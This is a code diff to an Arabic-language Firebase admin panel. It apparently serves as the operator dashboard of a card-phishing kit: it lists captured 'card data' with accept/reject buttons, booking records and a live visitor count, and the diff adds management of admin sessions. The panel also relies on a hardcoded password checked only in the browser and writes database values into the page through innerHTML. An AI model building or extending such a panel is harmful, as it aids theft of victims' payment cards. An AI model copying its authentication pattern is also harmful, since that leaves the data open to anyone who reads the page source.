@@ -14,10 +14,10 @@
         .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
         .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         #adminContent { display: none; }
-        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
+        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; flex-wrap: wrap; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 10px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; min-width: 120px; font-size: 13px; }
         .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 14px; display: flex; justify-content: center; gap: 20px; }
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
@@ -34,7 +34,13 @@
         .btn-accept { background: #28a745; }
         .btn-reject { background: #dc3545; }
         .btn-delete { background: #6c757d; }
-        .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
+        .btn-kick { background: #ff4757; }
+        .logout-btn { background: #000 !important; font-size: 12px; }
+        
+        /* تصميم قائمة الأجهزة */
+        .session-item { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #ddd; }
+        .session-info { font-size: 14px; }
+        .session-info span { color: #666; font-size: 12px; display: block; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
@@ -50,10 +56,14 @@
 </div>
 
 <div id="adminContent">
-    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">
+        <span>الزوار الآن: <span id="onlineCount">0</span> 🌐</span>
+        <span>الأجهزة المتصلة بالإدارة: <span id="adminSessionCount">0</span> 🖥️</span>
+    </div>
     <div class="navbar">
         <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
         <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+        <button class="nav-btn" onclick="openTab(event, 'sessionsSection')">🖥 الأجهزة المتصلة</button>
         <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
     </div>
     <div class="container">
@@ -63,13 +73,24 @@
         <div id="cardsSection" class="tab-content">
             <div id="paymentsContainer"></div>
         </div>
+        <div id="sessionsSection" class="tab-content">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <h3 style="margin:0;">الأجهزة التي لديها صلاحية الدخول الآن:</h3>
+                <button class="btn btn-reject" onclick="kickAllAdmins()">تسجيل خروج الكل</button>
+            </div>
+            <div id="sessionsList"></div>
+        </div>
     </div>
 </div>
 
 <script>
+    let mySessionId = localStorage.getItem("admin_session_id");
+
     function checkSavedLogin() {
         const isLogged = localStorage.getItem("admin_logged_in");
-        if (isLogged === "true") { showAdmin(); }
+        if (isLogged === "true" && mySessionId) { 
+            showAdmin(); 
+        }
     }
 
     function checkLogin() {
@@ -80,8 +101,19 @@
         const validPass = "888999000";
 
         if(validUsers.includes(userInput) && passInput === validPass) {
+            const sessionId = 'sess_' + Date.now();
             localStorage.setItem("admin_logged_in", "true");
-            showAdmin();
+            localStorage.setItem("admin_session_id", sessionId);
+            mySessionId = sessionId;
+            
+            // تسجيل الجلسة في فايربيس
+            initFirebase();
+            firebase.database().ref('admin_sessions/' + sessionId).set({
+                loginTime: new Date().toLocaleString('ar-EG'),
+                status: 'active'
+            }).then(() => {
+                showAdmin();
+            });
         } else {
             errorMsg.style.display = 'block';
         }
@@ -91,10 +123,24 @@
         document.getElementById('loginOverlay').style.display = 'none';
         document.getElementById('adminContent').style.display = 'block';
         initFirebase();
+        monitorMySession();
+    }
+
+    function monitorMySession() {
+        // مراقبة الجلسة الخاصة بي: إذا تم حذفها من قبل المدير، سجل خروج
+        firebase.database().ref('admin_sessions/' + mySessionId).on('value', (s) => {
+            if (!s.exists()) {
+                logout();
+            }
+        });
     }
 
     function logout() {
+        if (mySessionId) {
+            firebase.database().ref('admin_sessions/' + mySessionId).remove();
+        }
         localStorage.removeItem("admin_logged_in");
+        localStorage.removeItem("admin_session_id");
         location.reload();
     }
 
@@ -112,12 +158,36 @@
         if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
 
-        // عرض المتواجدين الآن فقط (تصفير تلقائي)
+        // عرض زوار الموقع
         database.ref('online_tracking').on('value', s => {
             document.getElementById('onlineCount').innerText = s.numChildren();
         });
 
-        // عرض بيانات الحجز (آخر 50 سجل لضمان السرعة)
+        // عرض وإدارة جلسات الأدمن (الأجهزة)
+        database.ref('admin_sessions').on('value', (snapshot) => {
+            const list = document.getElementById('sessionsList');
+            const countSpan = document.getElementById('adminSessionCount');
+            list.innerHTML = '';
+            countSpan.innerText = snapshot.numChildren();
+            
+            snapshot.forEach((child) => {
+                const val = child.val();
+                const sid = child.key;
+                const isMe = (sid === mySessionId) ? " (جهازك الحالي)" : "";
+                
+                list.innerHTML += `
+                <div class="session-item">
+                    <div class="session-info">
+                        <strong>جهاز متصل ${isMe}</strong>
+                        <span>وقت الدخول: ${val.loginTime}</span>
+                        <span style="color:green">الحالة: نشط الآن</span>
+                    </div>
+                    ${sid !== mySessionId ? `<button class="btn btn-kick" onclick="deleteData('admin_sessions/${sid}')">طرد الجهاز</button>` : ''}
+                </div>`;
+            });
+        });
+
+        // عرض بيانات الحجز
         database.ref('visitors').limitToLast(50).on('value', (snapshot) => {
             const grid = document.getElementById('bookingGrid');
             grid.innerHTML = '';
@@ -133,7 +203,7 @@
             });
         });
 
-        // عرض بيانات البطاقات (آخر 50 سجل لضمان السرعة)
+        // عرض بيانات البطاقات
         database.ref('payments').limitToLast(50).on('value', (snapshot) => {
             const container = document.getElementById('paymentsContainer');
             container.innerHTML = '';
@@ -172,12 +242,18 @@
         });
     }
 
+    function kickAllAdmins() {
+        if(confirm('هل أنت متأكد من تسجيل خروج جميع الأجهزة؟')) {
+            firebase.database().ref('admin_sessions').remove();
+        }
+    }
+
     function updateStatus(userId, action) {
         firebase.database().ref('payments/' + userId).update({ status: action });
     }
 
     function deleteData(path) { 
-        if(confirm('هل أنت متأكد من حذف السجل نهائياً؟')) firebase.database().ref(path).remove(); 
+        if(confirm('هل أنت متأكد؟')) firebase.database().ref(path).remove(); 
     }
 
     function openTab(evt, tabName) {
